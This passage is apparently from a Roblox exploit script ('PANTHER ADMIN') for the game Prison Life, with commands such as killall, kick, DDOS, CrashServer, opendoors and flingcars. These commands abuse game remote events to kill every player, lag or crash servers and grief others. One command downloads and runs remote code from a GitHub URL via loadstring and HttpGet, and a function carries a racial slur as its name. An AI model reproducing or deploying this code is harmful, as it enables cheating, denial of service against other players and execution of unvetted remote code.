	Kaito:MoveTo(saved)
end
function Kaito:killall(TeamToKill)
	if not TeamToKill then
		local LastTeam = Player.Team
		local BulletTable = {}
		if Player.Team ~= game.Teams.Criminals then
			Kaito:ChangeTeam(game.Teams.Criminals,true)
		end
		Kaito:GetGun("Remington 870")
		local Gun = Player.Backpack:FindFirstChild("Remington 870") or Player.Character:FindFirstChild("Remington 870")
		repeat Kaito:swait() Gun = Player.Backpack:FindFirstChild("Remington 870") or Player.Character:FindFirstChild("Remington 870") until Gun

		for i,v in pairs(game:GetService("Players"):GetPlayers()) do
			if v and v~=Player  and v.Team == game.Teams.Inmates or v.Team == game.Teams.Guards and not table.find(Kaito.Whitelisted,v)  then
				for i =1,15 do
					BulletTable[#BulletTable + 1] = {
						["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),
						["Hit"] = v.Character:FindFirstChild("Head") or v.Character:FindFirstChildOfClass("Part"),
					}
				end
			end
		end
		task.spawn(function()
			game:GetService("ReplicatedStorage").ShootEvent:FireServer(BulletTable, Gun)
		end)
		Kaito:ChangeTeam(game.Teams.Inmates,true)
		Kaito:GetGun("Remington 870")
		repeat Kaito:swait() Gun = Player.Backpack:FindFirstChild("Remington 870") or Player.Character:FindFirstChild("Remington 870") until Gun
		local Gun = Player.Backpack:FindFirstChild("Remington 870") or Player.Character:FindFirstChild("Remington 870")
		for i,v in pairs(game.Teams.Criminals:GetPlayers()) do
			if v and v~=Player and not table.find(Kaito.Whitelisted,v) then
				for i =1,15 do
					BulletTable[#BulletTable + 1] = {
						["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),
						["Hit"] = v.Character:FindFirstChild("Head") or v.Character:FindFirstChildOfClass("Part"),
					}
				end
			end
		end
		task.spawn(function()
			game:GetService("ReplicatedStorage").ShootEvent:FireServer(BulletTable, Gun)
		end)
		if LastTeam ~= game.Teams.Inmates then
			Kaito:ChangeTeam(LastTeam,true)
		end
	elseif TeamToKill then
		if TeamToKill == game.Teams.Inmates or TeamToKill == game.Teams.Guards  then
			if Player.Team ~= game.Teams.Criminals then
				Kaito:ChangeTeam(game.Teams.Criminals)
			end
		elseif TeamToKill == game.Teams.Criminals then
			if Player.Team ~= game.Teams.Inmates then
				Kaito:ChangeTeam(game.Teams.Inmates)
			end
		end
		local BulletTable = {}
		for i,v in pairs(TeamToKill:GetPlayers()) do
			if v and v~=Player and  not table.find(Kaito.Whitelisted,v) then
				for i =1,15 do
					BulletTable[#BulletTable + 1] = {
						["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),
						["Hit"] = v.Character:FindFirstChild("Head") or v.Character:FindFirstChildOfClass("Part"),
					}
				end
			end
		end
		wait(.4)
		Kaito:GetGun("M9")
		local Gun = Player.Backpack:FindFirstChild("M9") or Player.Character:FindFirstChild("M9")
		repeat task.wait() Gun = Player.Backpack:FindFirstChild("M9") or Player.Character:FindFirstChild("M9") until Gun

		task.spawn(function()
			game:GetService("ReplicatedStorage").ShootEvent:FireServer(BulletTable, Gun)
		end)
	end
end
function Kaito:GuardsFull(a)
	if #game:GetService("Teams").Guards:GetPlayers()==8 then
		if a then
			if Player.Team == game.Teams.Guards then
				return false
			end
		end
		return false
	end
	return true
end
function Kaito:AllGuns()
	local saved = game:GetService("Players").LocalPlayer.Character:GetPrimaryPartCFrame()
	if game:GetService("MarketplaceService"):UserOwnsGamePassAsync(plr.UserId, 96651) then
		Kaito:GetGun("M4A1", true)
	end
	Kaito:GetGun("AK-47", true)
	task.spawn(function()
		Kaito:GetGun("Remington 870", true)
	end)
	Kaito:GetGun("M9", true)
	game:GetService("Players").LocalPlayer.Character:SetPrimaryPartCFrame(saved)
end
function Kaito:GetHumanoid()
	return plr.Character:FindFirstChildOfClass("Humanoid")
end

function Kaito:touch(Toucher, TouchThis)
	if not Toucher or not TouchThis then
		return
	end
	task.spawn(function()
		firetouchinterest(Toucher, TouchThis, 0)
		firetouchinterest(Toucher, TouchThis, 1)
	end)
end
function AntiPunchC(v2)
	if States.antipunch == false then
		return
	end
	pcall(function()
		if v2 == plr then
			return
		end
		v2.Character:FindFirstChildOfClass("Humanoid").AnimationPlayed:Connect(function(animationTrack)
			pcall(function()
				if not Unloaded and States.antipunch then
					if animationTrack.Animation.AnimationId == "rbxassetid://484200742" or animationTrack.Animation.AnimationId =="rbxassetid://484926359" then
						if (plr.Character.HumanoidRootPart.Position-v2.Character.HumanoidRootPart.Position).magnitude <3.5 and States.antipunch and not table.find(Kaito.Whitelisted,v2) then
							for i =1,13 do
								task.spawn(function()
									game.ReplicatedStorage["meleeEvent"]:FireServer(v2)
								end)
							end
						end
					end
				end
			end)
		end)
	end)
end
local Flying = false
function Kaito:Fly(speed)
	Flying = true
	local Controler = require(game:GetService("Players").LocalPlayer.PlayerScripts:WaitForChild('PlayerModule'):WaitForChild("ControlModule"))
	local BodyA,BodyB = Instance.new("BodyVelocity"),Instance.new("BodyGyro")
	BodyA.Parent = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart
	BodyA.MaxForce = Vector3.new(0,0,0)
	BodyA.Velocity = Vector3.new(0,0,0)
	BodyB.Parent = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart
	BodyB.MaxTorque = Vector3.new(4^234,4^234,4^234)
	BodyB.P = 10000
	BodyB.D = 50
	Temp.FlyA = BodyA
	Temp.FlyB = BodyB
	local camera = game.Workspace.CurrentCamera
	Temp.FlyConnection = game:GetService"RunService".RenderStepped:Connect(function()
		if game:GetService("Players").LocalPlayer.Character and game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid").Health >0 and BodyA and BodyB then
			local direction = Controler:GetMoveVector()
			BodyA.MaxForce = Vector3.new(4^234,4^234,4^234)
			BodyB.MaxTorque = Vector3.new(4^234,4^234,4^234)
			BodyB.CFrame = camera.CoordinateFrame
			BodyA.Velocity = Vector3.new()
			if direction.X > 0 then
				BodyA.Velocity = BodyA.Velocity + camera.CFrame.RightVector*(direction.X*(speed*10))
			end
			if direction.X < 0 then
				BodyA.Velocity = BodyA.Velocity + camera.CFrame.RightVector*(direction.X*(speed*10))
			end
			if direction.Z > 0 then
				BodyA.Velocity = BodyA.Velocity - camera.CFrame.LookVector*(direction.Z*(speed*10))
			end
			if direction.Z < 0 then
				BodyA.Velocity = BodyA.Velocity - camera.CFrame.LookVector*(direction.Z*(speed*10))
			end
		end
	end)
end
function Kaito:Unfly()
	if Flying then
		Flying = false
		Kaito:Destroy(Temp.FlyA)
		Kaito:Destroy(Temp.FlyB)
		Temp.FlyConnection:Disconnect()
		Kaito:Refresh(true)
	end
end
function Kaito:kick(Player)
    Kaito:Notif("Lagging the player...")
    local Bullets = Kaito:CreateBulletTable(10, Player, true)
    repeat
        task.wait()
    until Player.Backpack:FindFirstChild("M9") or Player.Character:FindFirstChild("M9") 
    game:GetService("ReplicatedStorage").ReloadEvent:FireServer(Player.Backpack:FindFirstChild("M9") or Player.Character:FindFirstChild("M9"))
    for i = 1, 40 do
        local Gun = Player.Backpack:FindFirstChild("M9") or Player.Character:FindFirstChild("M9") 
        if not Gun or not Kaito:GetHumanoid() or Kaito:GetHumanoid().Health < 1 then
            task.wait(4) -- Ping cooldown
            Kaito:kick(Player) -- Recursive call to lag the player again
            break
        end
        coroutine.wrap(function()
            game:GetService("ReplicatedStorage").ShootEvent:FireServer({}, Gun)
        end)()
        coroutine.wrap(function()
            game:GetService("ReplicatedStorage").ReloadEvent:FireServer(Gun)
        end)()
    end
end
function Kaito:DDOS()
	Kaito:Notif("Sending a lot of Events to server...")
	local Bullets = Kaito:CreateBulletTable(10, nil, true)
	if Kaito:GuardsFull() then
		Kaito:GetGun("M9")
	else
		Kaito:ChangeTeam(game.Teams.Guards)
	end
	repeat
		task.wait()
	until Player.Backpack:FindFirstChild("M9") or Player.Character:FindFirstChild("M9") 
	game:GetService("ReplicatedStorage").ReloadEvent:FireServer(Player.Backpack:FindFirstChild("M9") or Player.Character:FindFirstChild("M9"))
	for i = 1,40 do
		local Gun = Player.Backpack:FindFirstChild("M9") or Player.Character:FindFirstChild("M9") 
		if not Gun or not Kaito:GetHumanoid() or Kaito:GetHumanoid() and Kaito:GetHumanoid().Health < 1  then
			task.wait(4)--//Ping cool down
			Kaito:DDOS()
			break
		end
		coroutine.wrap(function()
			game:GetService("ReplicatedStorage").ShootEvent:FireServer({}, Gun)
		end)()
		coroutine.wrap(function()
			game:GetService("ReplicatedStorage").ReloadEvent:FireServer(Gun)
		end)()
	end
end
function Kaito:Crasher()
	if not PremiumActivated then
		return
	end
	Kaito:Notif("Attempting to crash the server...")
	local Bullets = Kaito:CreateBulletTable(6, nil, true)
	if Kaito:GuardsFull() then
		Kaito:GetGun("Remington 870")
	else
		Kaito:ChangeTeam(game.Teams.Guards)
	end
	repeat
		task.wait()
	until Player.Backpack:FindFirstChild("Remington 870") or Player.Character:FindFirstChild("Remington 870") 
	game:GetService("ReplicatedStorage").ReloadEvent:FireServer(Player.Backpack:FindFirstChild("Remington 870") or Player.Character:FindFirstChild("Remington 870"))
	local Gun = Player.Backpack:FindFirstChild("Remington 870") or Player.Character:FindFirstChild("Remington 870") 
	task.spawn(function()
		for i = 1,15 do
			game:GetService("ReplicatedStorage").ShootEvent:FireServer({}, Gun)
		end
	end)
	while wait() do
		if not Gun or not Kaito:GetHumanoid() or Kaito:GetHumanoid() and Kaito:GetHumanoid().Health < 1  then
			task.wait(5)--//Ping cool down
			Kaito:Crasher()
			break
		end
	end
end

function Kaito:CrashServer()
	if not PremiumActivated then
		return
	end
	Kaito:Notif("Attempting to crash the server...")
	local Bullets = Kaito:CreateBulletTable(40, nil, true)
	if Kaito:GuardsFull() then
		Kaito:GetGun("M9")
	else
		Kaito:ChangeTeam(game.Teams.Guards)
	end
	repeat
		task.wait()
	until Player.Backpack:FindFirstChild("M9") or Player.Character:FindFirstChild("M9") 
	game:GetService("ReplicatedStorage").ReloadEvent:FireServer(Player.Backpack:FindFirstChild("M9") or Player.Character:FindFirstChild("M9"))
	local Gun = Player.Backpack:FindFirstChild("M9") or Player.Character:FindFirstChild("M9") 
	task.spawn(function()
		for i = 1,5000 do
			game:GetService("ReplicatedStorage").ShootEvent:FireServer({}, Gun)
		end
	end)
	while wait() do
		if not Gun or not Kaito:GetHumanoid() or Kaito:GetHumanoid() and Kaito:GetHumanoid().Health < 1  then
			task.wait(5)--//Ping cool down
			Kaito:CrashServer()
			break
		end
	end
end
function Kaito:Destroy(v)
	v:Destroy()
	pcall(function()
		v:Remove()
	end)
end

function Kaito:teleportAndSpinAbovePlayer()
    local player = game.Players.LocalPlayer
    local humanoid = player.Character and player.Character.Humanoid
    if not humanoid then
        return
    end

    -- Calculate a random position above current position (500 to 1000 studs high)
    local lastPosition = player.Character.HumanoidRootPart.Position
    local abovePosition = Vector3.new(lastPosition.X, lastPosition.Y + math.random(500, 1000), lastPosition.Z)

    -- Teleport above the calculated position
    humanoid.Parent:SetPrimaryPartCFrame(CFrame.new(abovePosition))

    -- Enable noclip to move through walls
    humanoid:ChangeState(Enum.HumanoidStateType.Physics)
    humanoid:ChangeState(Enum.HumanoidStateType.Seated)

    -- Start spinning the humanoid rapidly
    local spinSpeed = 1000  -- Degrees per second
    local spinAxis = Vector3.new(0, 1, 0)  -- Spin around the Y-axis

    local function spinHumanoid()
        while true do
            humanoid:SetRotation(humanoid.Parent.CFrame:vectorToWorldSpace(spinAxis) * spinSpeed)
            wait(0.03)
        end
    end

    -- Start spinning coroutine
    coroutine.wrap(spinHumanoid)()

    -- Rush down quickly while spinning
    local rushDownSpeed = 300
    local initialHeight = humanoid.Parent.Position.Y
    local grounded = false

    while not grounded do
        humanoid:Move(Vector3.new(0, -rushDownSpeed, 0))
        wait(0.1)  -- Adjust the wait time as needed for responsiveness

        -- Check if humanoid is near ground
        local currentHeight = humanoid.Parent.Position.Y
        if currentHeight <= initialHeight then
            grounded = true
        end
    end

    -- Stop spinning when grounded
    humanoid:Move(Vector3.new(0, 0, 0))
    humanoid:MoveTo(player.Character.HumanoidRootPart.Position)
end

function Kaito:BadArea(Player)
	local mod = require(game.ReplicatedStorage["Modules_client"]["RegionModule_client"])
	local a = pcall(function()
		if mod.findRegion(Player.Character) then
			mod = mod.findRegion(Player.Character)["Name"]
		end
	end)
	if not a then
		return
	end
	for i, v in pairs(game:GetService("ReplicatedStorage").PermittedRegions:GetChildren()) do
		if v and mod == v.Value then
			return false
		end
	end
	return true
end

plr.CharacterAdded:Connect(function(NewCharacter)
	if Unloaded then
		return
	end
	task.spawn(function()
		if States.AutoItems then
			wait(.5)
			Kaito:AllGuns()
		end
	end)
	repeat Kaito:swait() until NewCharacter
	NewCharacter:WaitForChild("HumanoidRootPart")
	NewCharacter:WaitForChild("Head")
	NewCharacter:WaitForChild("Humanoid").BreakJointsOnDeath = not States.AutoRespawn
	NewCharacter:WaitForChild("Humanoid").Died:Connect(function()
		if not Unloaded and States.AutoRespawn == true then
			Kaito:Refresh()
			task.spawn(function()
				if States.AutoItems then
					wait(.5)
					Kaito:AllGuns()
				end
			end)
		end
	end)
	if Temp.ArrestOldP and States.AntiArrest then
		coroutine.wrap(function()
			Kaito:MoveTo(Temp.ArrestOldP)
			Temp.ArrestOldP = nil
		end)()
	end
	task.spawn(function()
		if States.AntiArrest then
			plr.Character:FindFirstChild("Head").ChildAdded:Connect(function(a)
				if not Unloaded then
					if a and a:IsA("BillboardGui") and States.AntiArrest then
						Kaito:Refresh()
						coroutine.wrap(function()
							wait(1)
							Temp.ArrestOldP = Kaito:GetPosition()
						end)()
					end
				end
			end)
		end
	end)
	if States.AntiTase then
		for i,v in pairs(getconnections(workspace:WaitForChild("Remote").tazePlayer.OnClientEvent)) do
			v:Disable()
		end
	end
end)
Kaito:Refresh(true)
local Killcool1 = false
plr:GetMouse().Button1Up:Connect(function()
	local Target = plr:GetMouse().Target
	if Killcool1 then return end
	if States.ClickArrest or States.ClickKill then
		if Target and Target.Parent and Target.Parent:FindFirstChildOfClass("Humanoid") and game:GetService("Players"):FindFirstChild(Target.Parent.Name) or game:GetService("Players"):FindFirstChild(Target.Parent.Parent.Name) then
			local TargetModelPlr = game:GetService("Players"):FindFirstChild(Target.Parent.Name) or game:GetService("Players"):FindFirstChild(Target.Parent.Parent.Name)
			if States.ClickArrest then
				if TargetModelPlr.Team ~= game:GetService("Teams").Guards then
					local ohInstance1 = Target
					workspace.Remote.arrest:InvokeServer(ohInstance1)
				end
			end
			if States.ClickKill then
				Kaito:KillPlayer(TargetModelPlr)
				Killcool1 = true
				wait(.6)
				Killcool1 = false
			end
		end
	end
end)
local ChangeState = function(Type,StateType)
	local Value = nil
	if Type and typeof(Type):lower() == "string" and (Type):lower() == "on" then
		Value = true
	elseif Type and typeof(Type):lower() == "string" and (Type):lower() == "off" then
		Value = false
	elseif typeof(Type):lower() == "boolean" then
		Value = Type
	else
		Value = not States[StateType]
	end
	States[StateType] = Value
	Kaito:Notif(StateType.." has been changed to "..tostring(Value))
	return Value
end
do
	if PremiumActivated then
	    Kaito:AddCmd("CopyNewCommands", "Copy Commands From Cmds To Clipboard", function(args)
    setclipboard("secretroom, mansion, exploiterbase, trap, guardtower, gate, prisonback, cells, whitehouse, lobby, Cctv, Armory, office, and more.")
end, nil, nil, true)
		Kaito:AddCmd("flingcars", "deletes all cars that are not seated", function(args)
			local Old = Kaito:GetPosition()
			for i,v in pairs(game:GetService("Workspace").CarContainer:GetChildren()) do
				if v then
					repeat task.wait() until Player.Character:FindFirstChildOfClass("Humanoid").Health >1

					local car = v
					if car:FindFirstChild("RWD")and  car:FindFirstChild("Body") and car:FindFirstChild("Body"):FindFirstChild("VehicleSeat").Occupant == nil then
						local Seat = car.Body.VehicleSeat
						car.PrimaryPart = car.RWD
						repeat wait()
							Seat:Sit(Player.Character:FindFirstChildOfClass("Humanoid"))
						until Player.Character:FindFirstChildOfClass("Humanoid").Sit == true
						for i =1,5 do
							wait()
							car:SetPrimaryPartCFrame(CFrame.new(3^5,workspace.FallenPartsDestroyHeight+5,23453225))
						end
						wait(.1)
						Kaito:UnSit()
					end
				end
			end
			Kaito:MoveTo(Old)
		end,nil,nil,true)
		Kaito:AddCmd("DDOS", "Ultimate Lags the server", function(args)
			Kaito:DDOS()
		end,nil,nil,true)
		Kaito:AddCmd("kick", "Lags the target player", function(args)
    local Player = Kaito:FindPlayer(args[2])
    if Player then
        Kaito:kick(Player)
    else
        Kaito:Notif("Player not found!")
    end
end,nil,"[PLAYER]",true)
        Kaito:AddCmd("NUKE", "Launch Nuke instantly.", function(args)
            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("PANTHER ADMIN: NUKE WAS LAUNCHED!!!", "ALL")
            Kaito:teleportAndSpinAbovePlayer()
            wait(3)
            Kaito:killall()
end, nil, nil, true)
        Kaito:AddCmd("PrizzLife", "Executes PrizzLife Admin", function(args)
            loadstring(game:HttpGet('https://raw.githubusercontent.com/elliexmln/PrizzLife/main/pladmin.lua'))()
end, nil, nil, true)
		Kaito:AddCmd("prefix", "Sets a different prefix", function(args)
			local New = args[2]
			if New and tostring(New) then
				local Prefixn = tostring(New)
				Settings.Prefix = Prefixn
				Kaito:Notif("prefix set to "..New)
			else
				Kaito:Notif("no prefix selected?",false)
			end
		end,nil,"[NEW PREFIX]",true)
		Kaito:AddCmd("Piipee", "sus bruh", function(args)
			Kaito:AllGuns()
			wait(1)
			for i,v in pairs(Player.Character:GetChildren()) do
				if v:IsA("Tool") then
					v.Parent = Player.Backpack
				end
			end
			Player.Backpack.M9.Parent = Player.Character
			Player.Backpack["AK-47"].Parent = Player.Character
			Player.Backpack["Remington 870"].Parent = Player.Character
			wait()
			Player.Character.M9.GripPos = Vector3.new(0.9, 2, 0)
			Player.Character["Remington 870"].GripPos = Vector3.new(0.9, 2, 2.1)
			Player.Character["AK-47"].GripPos = Vector3.new(0.9, 2, 6.4)
			wait()
			for i,v in pairs(Player.Character:GetChildren()) do
				if v:IsA("Tool") then
					v.Parent = Player.Backpack
				end
			end
			wait()
			Player.Backpack.M9.Parent = Player.Character
			Player.Backpack["AK-47"].Parent = Player.Character
			Player.Backpack["Remington 870"].Parent = Player.Character
		end,nil,nil,true)
		Kaito:AddCmd("Jeff", "Jeff the killer npc (rejoin to disable)", function(args)
			task.spawn(function()
				local player = game.Players.LocalPlayer
				local anim = nil
				local anim2  = nil
				function blackpeople()
					repeat
						wait()
						workspace.Remote.ItemHandler:InvokeServer({Position=player.Character.Head.Position,Parent=workspace.Prison_ITEMS.single["Crude Knife"]})
					until player.Backpack:FindFirstChild("Crude Knife")
					local crude = player.Backpack:WaitForChild("Crude Knife")
					crude.Parent = player.Character
					local anim = Instance.new("Animation")
					local anim2 = anim:Clone()
					anim.AnimationId = "rbxassetid://252557606"
					anim2.AnimationId = crude:WaitForChild("Handle"):WaitForChild("Animation").AnimationId
					anim = player.Character.Humanoid:LoadAnimation(anim)
					anim2 = player.Character.Humanoid:LoadAnimation(anim2)
					anim:Play()
					anim.Looped = true
				end
				blackpeople()
				player.CharacterAdded:Connect(function(a)
					a:WaitForChild("HumanoidRootPart")
					blackpeople()
				end)
				task.spawn(function()
					local function findNearestPlayer(Position)
						wait(0.3)
						local List = game.Workspace:children()
						local Torso = nil
						local Distance = 30
						local Temp = nil
						local Human = nil
						local Temp2 = nil
						for x = 1, #List do
							Temp2 = List[x]
							if (Temp2.className == "Model") and (Temp2 ~= player.Character) then
								Temp = Temp2:findFirstChild("HumanoidRootPart")
								Human = Temp2:findFirstChild("Humanoid")
								if (Temp ~= nil) and (Human ~= nil) and (Human.Health > 0) then
									if (Temp.Position - Position).magnitude < Distance then
										Torso = Temp
										Distance = (Temp.Position - Position).magnitude
									end
								end
							end
						end
						return Torso
					end
					task.spawn(function()
						while wait(math.random(3,5)) do
							pcall(function()
								player.Character:FindFirstChildOfClass("Humanoid").Jump = true
							end)
						end
					end)
					while true do
						task.wait()
						pcall(function()
							game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):SetStateEnabled(Enum.HumanoidStateType.Seated, true)
							player.Character.Humanoid.WalkSpeed = 25
							local target = findNearestPlayer(player.Character.HumanoidRootPart.Position)
							if target ~= nil then
								player.Character.Humanoid:MoveTo(target.Position, target)
								if (target.Position - player.Character.Head.Position).magnitude < 5 then
									if anim2 then
										anim2:Play()
										anim2.Priority = Enum.AnimationPriority.Action4
									end
									for i = 1,3 do game.ReplicatedStorage.meleeEvent:FireServer(game.Players[target.Parent.Name]) end
								end
							else
								wait(math.random(2,3))
								local new = player.Character:GetPrimaryPartCFrame()
								new = new *CFrame.new(math.random(4,17),0,math.random(4,24)).Position
								player.Character.Humanoid:MoveTo(new)
							end
						end)
					end
				end)
			end)
		end,nil,nil,true)
		Kaito:AddCmd("opendoors", "Opens every single door", function(args)
			if not firetouchinterest then
				return Kaito:Notif("Your exploit doesnt support this command!",false)
			end
			local LastTeam =plr.Team
			Kaito:ChangeTeam(game.Teams.Guards)
			wait(.7)
			task.spawn(function()
				local Arg_1 = game:GetService("Workspace")["Prison_ITEMS"].buttons["Prison Gate"]["Prison Gate"]
				local Event = game:GetService("Workspace").Remote.ItemHandler
				Event:InvokeServer(Arg_1)
			end)
			for i,v in pairs(game:GetService("Workspace").Doors:GetChildren()) do
				if v then
					if v:FindFirstChild("block") and v:FindFirstChild("block"):FindFirstChild("hitbox") then
						firetouchinterest(Player.Character.HumanoidRootPart,v.block.hitbox,0)
						firetouchinterest(Player.Character.HumanoidRootPart,v.block.hitbox,1)
					end
				end
			end
			wait(1)
			Kaito:ChangeTeam(LastTeam)
		end,nil,nil,true)
		Kaito:AddCmd("loopopendoors", "Opens every single door on loop", function(args)
			local value = ChangeState(args[2],"loopopendoors")
			if value then
				while wait(2.4) do
					if not States.loopopendoors then
						break
					end
					if not firetouchinterest then
						return Kaito:Notif("Your exploit doesnt support this command!",false)
					end
					local LastTeam =plr.Team
					Kaito:ChangeTeam(game.Teams.Guards)
					wait(.7)
					task.spawn(function()
						local Arg_1 = game:GetService("Workspace")["Prison_ITEMS"].buttons["Prison Gate"]["Prison Gate"]
						local Event = game:GetService("Workspace").Remote.ItemHandler
						Event:InvokeServer(Arg_1)
					end)
					for i,v in pairs(game:GetService("Workspace").Doors:GetChildren()) do
						if v then
							if v:FindFirstChild("block") and v:FindFirstChild("block"):FindFirstChild("hitbox") then
								if not States.loopopendoors then
									break
								end
								firetouchinterest(Player.Character.HumanoidRootPart,v.block.hitbox,0)
								firetouchinterest(Player.Character.HumanoidRootPart,v.block.hitbox,1)
							end
						end
					end
					if not States.loopopendoors then
						break
					end
					wait(1)
					Kaito:ChangeTeam(LastTeam)
				end
			end
		end,nil,nil,true)

		Kaito:AddCmd("hostage", "Cool script [REJOIN TO STOP]", function(args)
			task.spawn(function()
				workspace.Remote.ItemHandler:InvokeServer({Position=game:GetService("Players").LocalPlayer.Character.Head.Position,Parent=workspace.Prison_ITEMS.single["Crude Knife"]})
				repeat task.wait() until game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Crude Knife")
				game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Crude Knife").Parent = game:GetService("Players").LocalPlayer.Character
				local Player = game:GetService("Players").LocalPlayer
				local Character = Player.Character
				local Crude = Player.Backpack:FindFirstChild("Crude Knife") or Player.Character:FindFirstChild("Crude Knife")
				local OldPosition = Crude.Grip
				local PlayingAnimations = {}
				local Target = nil
				Player.CharacterAdded:Connect(function(a)
					a:WaitForChild("Humanoid")
					Character = a
					wait(.7)
					workspace.Remote.ItemHandler:InvokeServer({Position=game:GetService("Players").LocalPlayer.Character.Head.Position,Parent=workspace.Prison_ITEMS.single["Crude Knife"]})
					repeat task.wait() until game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Crude Knife")
					game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Crude Knife").Parent = game:GetService("Players").LocalPlayer.Character
					Crude= Player.Backpack:FindFirstChild("Crude Knife") or Player.Character:FindFirstChild("Crude Knife")
					Crude.Equipped:connect(function()
						task.wait(0.4)
						for _,Animation in pairs(Character.Humanoid:GetPlayingAnimationTracks()) do
							if string.find(Animation.Animation.AnimationId, "182393478") then
								Animation:Stop()
							end
						end
					end)
				end)
				local Mouse = Player:GetMouse()
				local function StopAnimations()
					for i,v in pairs(PlayingAnimations) do
						if v then
							v:Stop()
						end
					end
				end
				local function SetPos(New,New2,IsSlashing)
					Crude.Parent = Player.Backpack
					Crude.Grip = New2
					Crude.Grip *= New
					Crude.Parent = Player.Character
					if IsSlashing then
						task.spawn(function()
							game:GetService("ReplicatedStorage").meleeEvent:FireServer(Target)
						end)
					end
				end
				local function Idle()
					StopAnimations()
					Crude.Parent = Player.Backpack
					Crude.Grip = OldPosition
					Crude.Parent = Player.Character
				end
				Crude.Equipped:connect(function()
					task.wait(0.4)
					for _,Animation in pairs(Character.Humanoid:GetPlayingAnimationTracks()) do
						if string.find(Animation.Animation.AnimationId, "182393478") then
							Animation:Stop()
						end
					end
				end)
				local function Holding()
					local a = Instance.new("Animation")
					a.AnimationId = "rbxassetid://175676962"
					a = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(a)
					a:Play()
					a:AdjustSpeed(0)
					table.insert(PlayingAnimations, a)
					SetPos(CFrame.new(1.4,-2.1,0.5),CFrame.new(1.5,0,0)*CFrame.Angles(0, 0, math.rad(-90)))
				end
				local function Slash()
					StopAnimations()
					local a = Instance.new("Animation")
					a.AnimationId = "rbxassetid://175676962"
					a = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(a)
					a:Play()
					a:AdjustSpeed(0)
					table.insert(PlayingAnimations, a)
					SetPos(CFrame.new(1.4,-2.1,0.5),CFrame.new(1.5,0,0)*CFrame.Angles(0, 0, math.rad(-90)),true)
					task.wait()
					SetPos(CFrame.new(1.3,-2.1,0.5),CFrame.new(1.5,0,0)*CFrame.Angles(0, 0, math.rad(-90)))
					task.wait()
					SetPos(CFrame.new(1.2,-2.1,0.5),CFrame.new(1.5,0,0)*CFrame.Angles(0, 0, math.rad(-90)))
					task.wait()
					SetPos(CFrame.new(1.1,-2.1,0.5),CFrame.new(1.5,0,0)*CFrame.Angles(0, 0, math.rad(-90)))
					task.wait()
					SetPos(CFrame.new(1,-2.1,0.5),CFrame.new(1.5,0,0)*CFrame.Angles(0, 0, math.rad(-90)))
					task.wait()
					SetPos(CFrame.new(0.9,-2.1,0.5),CFrame.new(1.5,0,0)*CFrame.Angles(0, 0, math.rad(-90)),true)
					task.wait()
					SetPos(CFrame.new(0.8,-2.1,0.5),CFrame.new(1.5,0,0)*CFrame.Angles(0, 0, math.rad(-90)))
					task.wait()
					SetPos(CFrame.new(0.7,-2.1,0.5),CFrame.new(1.5,0,0)*CFrame.Angles(0, 0, math.rad(-90)),true)
					task.wait()
					SetPos(CFrame.new(0.6,-2.1,0.5),CFrame.new(1.5,0,0)*CFrame.Angles(0, 0, math.rad(-90)))
					task.wait()
					SetPos(CFrame.new(0.5,-2.1,0.5),CFrame.new(1.5,0,0)*CFrame.Angles(0, 0, math.rad(-90)),true)
					task.wait()
					SetPos(CFrame.new(0.4,-2.1,0.5),CFrame.new(1.5,0,0)*CFrame.Angles(0, 0, math.rad(-90)),true)
					task.wait()
					SetPos(CFrame.new(0.3,-2.1,0.5),CFrame.new(1.5,0,0)*CFrame.Angles(0, 0, math.rad(-90)))
					task.wait()
					SetPos(CFrame.new(0.1,-2.1,0.5),CFrame.new(1.5,0,0)*CFrame.Angles(0, 0, math.rad(-90)),true)
					task.wait()
					SetPos(CFrame.new(0,-2.1,0.5),CFrame.new(1.5,0,0)*CFrame.Angles(0, 0, math.rad(-90)),true)
					task.wait()
					SetPos(CFrame.new(-.1,-2.1,0.5),CFrame.new(1.5,0,0)*CFrame.Angles(0, 0, math.rad(-90)),true)
					task.wait()
					SetPos(CFrame.new(-.2,-2.1,0.5),CFrame.new(1.5,0,0)*CFrame.Angles(0, 0, math.rad(-90)))
					task.wait()
					SetPos(CFrame.new(-.3,-2.1,0.5),CFrame.new(1.5,0,0)*CFrame.Angles(0, 0, math.rad(-90)),true)
					task.wait()
					SetPos(CFrame.new(-.4,-2.1,0.5),CFrame.new(1.5,0,0)*CFrame.Angles(0, 0, math.rad(-90)))
					task.wait()
					SetPos(CFrame.new(-.5,-2.1,0.5),CFrame.new(1.5,0,0)*CFrame.Angles(0, 0, math.rad(-90)),true)
					task.wait()
					SetPos(CFrame.new(-.6,-2.1,0.5),CFrame.new(1.5,0,0)*CFrame.Angles(0, 0, math.rad(-90)),true)
					task.wait()
					SetPos(CFrame.new(-.7,-2.1,0.5),CFrame.new(1.5,0,0)*CFrame.Angles(0, 0, math.rad(-90)),true)
					task.wait()
					SetPos(CFrame.new(-.8,-2.1,0.5),CFrame.new(1.5,0,0)*CFrame.Angles(0, 0, math.rad(-90)),true)
					task.wait()
					wait(.5)
					StopAnimations()
					Idle()
				end
				Mouse.Button1Up:Connect(function()
					if not Target then
						for i,v in pairs(game:GetService("Players"):GetPlayers()) do
							if v and v~=Player then
								if (Character:GetPrimaryPartCFrame().Position-v.Character:GetPrimaryPartCFrame().Position).Magnitude <10 and v.Character:FindFirstChildOfClass("Humanoid").Health>1 then
									if not Target then
										Target = v
										Holding()
										break
									end
								end
							end
						end
					end
				end)
				game:GetService("RunService").Stepped:Connect(function()
					if Target and Target.Character:FindFirstChildOfClass("Humanoid") and Target.Character:FindFirstChildOfClass("Humanoid").Health>1 then
						Character:SetPrimaryPartCFrame(Target.Character:GetPrimaryPartCFrame()*CFrame.new(0,0,1.1))
					end
				end)
				game:GetService("UserInputService").InputEnded:Connect(function(a,b)
					if not b then
						if a.KeyCode == Enum.KeyCode.E and Target then
							Slash()
